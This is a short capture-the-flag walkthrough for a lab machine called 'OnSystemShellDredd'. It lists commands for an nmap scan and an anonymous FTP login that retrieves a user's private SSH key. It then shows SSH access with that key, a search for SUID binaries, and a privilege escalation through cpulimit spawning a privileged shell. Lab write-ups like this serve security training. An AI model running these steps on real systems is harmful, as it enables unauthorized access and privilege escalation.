----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# OnSystemShellDredd
# 7/1/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
nmap -sV -p- 192.168.217.130 -oN nmapAllPorts -T4 

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)



ftp
Anonymous
.hannah
get id_rsa


ssh -i id_rsa hannah@192.168.217.130 -p 61000

find / -perm -u=s -type f 2>/dev/null


cpulimit -l 100 -f -- /bin/sh -p

